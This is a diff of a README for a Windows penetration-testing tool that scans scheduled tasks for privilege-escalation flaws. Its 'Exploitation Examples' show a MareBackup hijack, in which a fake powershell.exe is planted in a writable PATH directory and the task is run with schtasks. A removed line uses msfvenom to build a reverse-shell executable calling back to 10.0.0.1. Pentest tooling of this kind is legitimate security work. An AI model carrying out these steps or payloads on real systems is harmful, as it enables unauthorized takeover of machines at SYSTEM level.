@@ -1,12 +1,8 @@
 # TaskPrivEscScanner
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform">
-  <img src="https://img.shields.io/badge/.NET-4.8-purple?style=flat-square" alt=".NET Version">
-  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="License">
-</p>
+A Windows Scheduled Task privilege escalation scanner for penetration testing. Identifies misconfigured scheduled tasks that can be exploited for local privilege escalation.
 
-A Windows Scheduled Task privilege escalation scanner for penetration testing and red team operations. Identifies misconfigured scheduled tasks that can be exploited for local privilege escalation.
+Note: Serverity means how interesting the Scheduled Task is. Everything under Critical is not directly exploitable. High findings need a special secondary condition like arbitrary Write or Delete, something like that.
 
 ## Features
 
@@ -17,26 +13,6 @@ A Windows Scheduled Task privilege escalation scanner for penetration testing an
 - **Writable PATH Detection**: Identifies writable directories in SYSTEM PATH for DLL hijacking
 - **MareBackup Detection**: Specific detection for the MareBackup privilege escalation technique
 - **Exploitation Guidance**: Provides step-by-step exploitation instructions for each finding
-
-## Screenshot
-
-```
-╔══════════════════════════════════════════════════════════════════════════════╗
-║  ████████╗ █████╗ ███████╗██╗  ██╗██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗║
-║  ╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝║
-║     ██║   ███████║███████╗█████╔╝ ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗║
-║     ██║   ██╔══██║╚════██║██╔═██╗ ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║║
-║     ██║   ██║  ██║███████║██║  ██╗██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║║
-║     ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝║
-║            Scheduled Task Privilege Escalation Scanner  v1.1                 ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-```
-
-## Installation
-
-### Pre-built Binary
-
-Download the latest release from the [Releases](../../releases) page.
 
 ### Build from Source
 
@@ -112,14 +88,6 @@ Checks for directories in SYSTEM PATH that are writable by low-privileged users.
       Writable By: BUILTIN\Users
 ```
 
-### 5. MareBackup Privilege Escalation
-
-Specific detection for the MareBackup scheduled task technique.
-
-**References:**
-- [Hijacking the Windows MareBackup Scheduled Task for Privilege Escalation](https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/)
-- [SCRT Blog - Exploits](https://blog.scrt.ch/category/exploit/)
-
 ## Exploitation Examples
 
 ### Writable Binary
@@ -141,9 +109,6 @@ copy "C:\VulnerableApp\updater.exe.bak" "C:\VulnerableApp\updater.exe"
 
 ### MareBackup + Writable PATH
 ```batch
-:: Create malicious powershell.exe (the actual hijack target)
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o powershell.exe
-
 :: Place in writable PATH directory (must be BEFORE C:\Windows\System32\WindowsPowerShell\v1.0\)
 copy powershell.exe "C:\Python39\Scripts\powershell.exe"
 
@@ -158,6 +123,8 @@ schtasks /run /tn "\Microsoft\Windows\Application Experience\MareBackup"
 :: Cleanup
 del "C:\Python39\Scripts\powershell.exe"
 ```
+**References:**
+- [Hijacking the Windows MareBackup Scheduled Task for Privilege Escalation](https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/)
 
 ### DLL Hijacking Analysis
 
